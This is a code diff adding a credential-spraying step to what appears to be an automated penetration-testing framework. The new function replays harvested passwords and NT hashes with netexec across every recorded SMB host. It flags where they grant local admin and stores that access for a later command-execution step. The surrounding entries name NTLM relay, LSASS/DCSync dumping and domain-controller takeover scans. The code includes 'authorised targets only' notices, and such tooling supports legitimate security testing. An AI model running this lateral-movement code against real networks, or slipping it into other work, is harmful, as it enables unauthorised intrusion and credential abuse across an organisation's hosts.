@@ -2223,6 +2223,20 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2aj) smb-spray: harvested creds valid elsewhere (reuse) → local admin is critical
+    if sid == "smb-spray":
+        admin = re.findall(r"^✗ ADMIN (.+?)\s{2}", output, re.M)
+        valid = re.findall(r"^✓ VALID (.+)$", output, re.M)
+        if admin:
+            shown = "; ".join(a.strip() for a in admin[:3]) + (f" +{len(admin) - 3}" if len(admin) > 3 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"local admin via reuse: {shown}"[:140]}
+        if valid:
+            shown = "; ".join(v.strip() for v in valid[:3]) + (f" +{len(valid) - 3}" if len(valid) > 3 else "")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"valid creds (reuse): {shown}"[:140]}
+        return None
+
     # 2ai) smb-dccve: confirmed DC-takeover CVE (ZeroLogon / noPac / PrintNightmare)
     if sid == "smb-dccve":
         hits = re.findall(r"^✗ VULN (.+)$", output, re.M)
@@ -2907,7 +2921,7 @@ _EXPLOIT_STEPS = {
         # ── DC-critical CVEs ──
         ("DC CVEs: ZeroLogon, noPac, PrintNightmare (detection only)", "smb-dccve"),
         # ── creds → exec / dump ──
-        "Spray creds & hashes (mind lockout)",
+        ("Spray creds & hashes (mind lockout)", "smb-spray"),
         "Valid creds / hash → shell",
         "Dump SAM / LSA / LSASS; DCSync",
         "Writable share → hash capture / payload",
@@ -9345,6 +9359,91 @@ def _tool_smb_dccve(ip: str, port: int, proto: str) -> str:
     return f"DC-critical CVEs — {ip}:{port}/{proto}  (detection only)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 9: credential spray across hosts (password reuse / lateral) ───────
+_SMBSPRAY_DEADLINE = 300         # s — overall cap
+_SMBSPRAY_MAX_CREDS = 60         # ceiling on distinct creds sprayed
+
+
+def _smb_spray_hosts() -> list:
+    """Every DB host with SMB open (445/139) — the spray surface."""
+    hosts = []
+    for row in fetch_hosts():
+        hip = row[0]
+        if any(p in (445, 139) and pr == "tcp" for p, pr, _st in fetch_ports(hip)):
+            hosts.append(hip)
+    return hosts
+
+
+def _gather_all_smb_creds() -> list:
+    """(domain, user, secret) creds harvested on ANY host — deduped across the DB."""
+    out, seen = [], set()
+    for row in fetch_hosts():
+        for dom, user, secret in _gather_smb_creds(row[0], 445, "tcp"):
+            key = (dom.lower(), user.lower(), secret)
+            if user and key not in seen:
+                seen.add(key)
+                out.append((dom, user, secret))
+    return out
+
+
+def _tool_smb_spray(ip: str, port: int, proto: str) -> str:
+    """SMB step 9 tool: validate every harvested credential / NT hash across all DB hosts with
+    SMB open — password-reuse & lateral-movement surface. Each pair is the account's own real
+    secret, tried once per host, so this does NOT spray many passwords at one account (no
+    lockout risk); it never guesses. netexec reports where each cred is valid and where it is
+    local admin (Pwn3d!). Confirmed access is saved to smb-creds (feeds the exec step). No root
+    needed. Raises if there are no harvested creds yet or no SMB hosts. Authorised targets only."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it to spray credentials")
+    hosts = _smb_spray_hosts()
+    if not hosts:
+        raise RuntimeError("no SMB hosts recorded — run port enumeration first")
+    creds = _gather_all_smb_creds()[:_SMBSPRAY_MAX_CREDS]
+    if not creds:
+        raise RuntimeError("no harvested creds to spray — run smb-loot / smb-gpp / smb-relay first")
+
+    import time
+    deadline = time.time() + _SMBSPRAY_DEADLINE
+    valids, admins = [], []                       # (host, who, secret)
+    for dom, user, secret in creds:
+        if time.time() > deadline:
+            break
+        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
+        if dom:
+            auth += ["-d", dom]
+        _, out = _smb_run([nxc, "smb", *hosts, *auth, "--continue-on-success"], 120)
+        who = f"{dom}\\{user}" if dom else user
+        for ln in out.splitlines():
+            m = re.match(r"SMB\s+(\S+)\s+\d+\s+\S+\s+\[\+\]", ln)
+            if not m:
+                continue
+            host = m.group(1)
+            if "(Pwn3d!)" in ln:
+                admins.append((host, who, secret))
+            else:
+                valids.append((host, who, secret))
+
+    seen_line = _load_manual_block(ip, port, proto, "smb-creds")  # annotate confirmed access
+    for host, who, secret in admins:
+        line = f"! {who.split(chr(92))[-1]}:{secret} @ admin on {host} [{host}]"
+        seen_line.setdefault(host, [])
+        if line not in seen_line[host]:
+            seen_line[host].append(line)
+    if admins:
+        _save_manual_block(ip, port, proto, "smb-creds", seen_line)
+
+    lines = [f"[*] {len(creds)} cred(s) × {len(hosts)} SMB host(s)"]
+    for host, who, _s in dict.fromkeys((a[0], a[1], None) for a in admins):
+        lines.append(f"✗ ADMIN {who} @ {host}  (Pwn3d!)")
+    for host, who, _s in dict.fromkeys((v[0], v[1], None) for v in valids):
+        lines.append(f"✓ VALID {who} @ {host}")
+    if not admins and not valids:
+        lines.append("· no host accepted the harvested creds (no reuse found)")
+    return f"Credential spray — {len(creds)}×{len(hosts)}  (reuse / lateral)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9382,6 +9481,7 @@ _STEP_TOOLS = {
     "smb-relay": ("NTLM relay → SAM dump (ntlmrelayx, signing-off targets, timed, root)", _tool_smb_relay),
     "smb-coerce": ("Auth coercion (netexec coerce_plus → drives relay/poison)", _tool_smb_coerce),
     "smb-dccve": ("DC-takeover CVE scan (ZeroLogon/noPac/PrintNightmare, detection only)", _tool_smb_dccve),
+    "smb-spray": ("Credential spray across hosts (netexec, reuse/lateral → admin)", _tool_smb_spray),
 }
 
 def _mins(seconds: int) -> str:
@@ -9434,6 +9534,7 @@ _STEP_TOOL_RUNS = {
     "smb-relay":        ("ntlmrelayx", f"{_mins(_SMBRELAY_DEADLINE)} min"),
     "smb-coerce":       ("netexec coerce_plus", f"{_mins(_SMBCOERCE_DEADLINE)} min"),
     "smb-dccve":        ("netexec zerologon/nopac/printnightmare", f"{_mins(_SMBDCCVE_DEADLINE)} min"),
+    "smb-spray":        ("netexec", f"{_mins(_SMBSPRAY_DEADLINE)} min"),
 }
 
 
@@ -9595,6 +9696,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-spray":                   # real creds only — 1 try/host, no guessing
+        nc, nh = len(_gather_all_smb_creds()), len(_smb_spray_hosts())
+        print(f"{DIM}   validates {BOLD}{nc}{RESET}{DIM} harvested cred(s) across {BOLD}{nh}{RESET}"
+              f"{DIM} SMB host(s) — real secrets, one try per host (no guessing, no lockout) · "
+              f"{RESET}{YELLOW}authorised targets only{RESET}{DIM} · deadline {_SMBSPRAY_DEADLINE // 60} min{RESET}")
     if tool_key == "smb-dccve":                   # detection only — ZeroLogon reset is destructive
         print(f"{YELLOW}   ⚠ DC-takeover CVE scan{RESET}{DIM} — detection only (netexec); ZeroLogon's "
               f"exploit resets the DC machine account and is NEVER run · noPac/PrintNightmare need "
